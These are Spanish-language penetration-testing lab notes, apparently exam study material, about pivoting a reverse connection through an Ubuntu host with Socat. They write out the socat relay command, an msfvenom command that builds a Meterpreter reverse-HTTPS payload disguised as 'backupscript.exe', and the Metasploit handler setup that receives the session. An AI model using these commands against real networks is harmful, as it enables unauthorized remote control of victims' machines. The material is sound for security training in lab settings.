
## 1. Concepto

**Socat** es una herramienta de retransmisión bidireccional que permite crear conexiones entre dos canales de red independientes.

Puede utilizarse como un _relay_ para escuchar en una IP y puerto y reenviar las conexiones a otro destino, sin necesidad de utilizar túneles SSH.

En esta sección, utilizamos Socat en un servidor Ubuntu que actúa como pivote para redirigir una conexión inversa desde Windows hacia nuestro equipo atacante.

### Escenario del laboratorio

|Máquina|Dirección IP|Función|
|---|---|---|
|Atacante|`10.10.14.18`|Ejecuta Metasploit y recibe la conexión.|
|Ubuntu|`172.16.5.129`|Host pivote que ejecuta Socat.|
|Windows|Red interna `172.16.5.0/23`|Objetivo que establece la conexión inversa.|

### Flujo de la conexión

```
Windows
   |
   | Conexión inversa a 172.16.5.129:8080
   v
Ubuntu — Socat
   |
   | Reenvío TCP
   v
Atacante — 10.10.14.18:80
   |
   v
Metasploit multi/handler
```

**Idea clave:** Windows se conecta a Ubuntu, y Socat reenvía el tráfico al listener del atacante.

---

## 2. Configurar Socat en Ubuntu

En el servidor Ubuntu, ejecutamos:

```
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

### Parámetros

|Parámetro|Función|
|---|---|
|`TCP4-LISTEN:8080`|Escucha conexiones TCP IPv4 en el puerto `8080`.|
|`fork`|Permite gestionar conexiones creando un proceso hijo para cada conexión aceptada.|
|`TCP4:10.10.14.18:80`|Reenvía el tráfico al equipo atacante, en el puerto `80`.|

En este escenario, Socat escucha en el puerto `8080` de Ubuntu y reenvía las conexiones al puerto `80` del atacante.

**Importante:** el puerto de escucha del pivote y el puerto del listener del atacante son diferentes.

---

## 3. Generar el payload de Windows

Generamos un ejecutable de Meterpreter HTTPS que se conectará a la IP interna de Ubuntu.

```
msfvenom -p windows/x64/meterpreter/reverse_https \
LHOST=172.16.5.129 \
LPORT=8080 \
-f exe \
-o backupscript.exe
```

### Parámetros importantes

- `windows/x64/meterpreter/reverse_https`: payload Meterpreter HTTPS para Windows x64.
    
- `LHOST=172.16.5.129`: IP del pivote a la que se conectará Windows.
    
- `LPORT=8080`: puerto donde escucha Socat.
    
- `-f exe`: genera un ejecutable de Windows.
    
- `-o backupscript.exe`: nombre del archivo de salida.
    

Después de generar el payload, debemos transferirlo al objetivo Windows mediante alguno de los métodos utilizados en las secciones anteriores.

---

## 4. Configurar el handler de Metasploit

En el equipo atacante, iniciamos Metasploit:

```
sudo msfconsole
```

Configuramos el handler:

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 80
run
```

### Configuración

|Parámetro|Valor|
|---|---|
|Payload|`windows/x64/meterpreter/reverse_https`|
|`LHOST`|`0.0.0.0`|
|`LPORT`|`80`|

El handler queda esperando conexiones en el puerto `80`, que es el destino al que Socat reenvía el tráfico.

**La configuración debe coincidir:** el tipo de payload del handler debe ser el mismo que el utilizado para generar el ejecutable.

---

## 5. Ejecutar el payload y recibir la sesión

Con Socat activo en Ubuntu y el handler escuchando en el atacante, ejecutamos el payload en Windows.

Si todo funciona correctamente, la conexión seguirá este recorrido:

1. Windows inicia la conexión inversa hacia `172.16.5.129:8080`.
    
2. Socat recibe la conexión en Ubuntu.
    
3. Socat reenvía el tráfico al atacante, `10.10.14.18:80`.
    
4. Metasploit procesa la conexión y establece una sesión Meterpreter.
    

Ejemplo de salida:

```
[*] Meterpreter session 1 opened
```

Una vez abierta la sesión, podemos consultar el usuario asociado:

```
meterpreter > getuid
```

En el ejemplo del material, el resultado es:

```
Server username: INLANEFREIGHT\victor
```

Esto permite comprobar con qué identidad se está ejecutando la sesión.

---

## 6. Errores que conviene revisar

|Problema|Qué comprobar|
|---|---|
|Windows no consigue conectarse|Que la IP y el puerto del payload correspondan al servicio Socat.|
|Socat no puede reenviar el tráfico|Que el atacante sea accesible desde Ubuntu y que el puerto de destino esté disponible.|
|Metasploit no recibe la conexión|Que el handler esté activo en el puerto configurado y utilice el payload correcto.|
|No se puede iniciar Socat|Comprobar si el puerto `8080` ya está ocupado y si se dispone de permisos suficientes.|
|La conexión llega, pero no se abre una sesión|Revisar los mensajes de Socat y Metasploit, la ejecución del payload y las restricciones de red.|

## 7. Flujo de trabajo para el laboratorio

1. Identificar el host pivote Ubuntu.
    
2. Iniciar Socat en Ubuntu para escuchar en el puerto `8080` y reenviar al atacante en el puerto `80`.
    
3. Generar el payload de Windows apuntando a `172.16.5.129:8080`.
    
4. Transferir el ejecutable al objetivo Windows.
    
5. Configurar el handler de Metasploit con el payload correspondiente y el puerto `80`.
    
6. Ejecutar el payload en Windows.
    
7. Comprobar que se establece la sesión Meterpreter.
    
8. Utilizar `getuid` para comprobar el usuario de la sesión.

## Puntos clave para el examen

- **Socat es un relay bidireccional** capaz de reenviar tráfico entre dos extremos de red.
    
- `TCP4-LISTEN:8080` configura el puerto TCP IPv4 de escucha.
    
- `fork` permite gestionar conexiones aceptadas mediante procesos hijos.
    
- `TCP4:<IP>:<PUERTO>` especifica el destino al que se reenvía el tráfico.
    
- El payload debe conectarse a la IP y al puerto donde escucha Socat.
    
- El handler de Metasploit debe escuchar en el puerto de destino configurado en Socat.
    
- Socat permite realizar esta redirección sin depender de la funcionalidad de port forwarding de SSH.
    
- La dirección IP y el puerto de destino del payload pueden ser distintos de los del listener final de Metasploit.
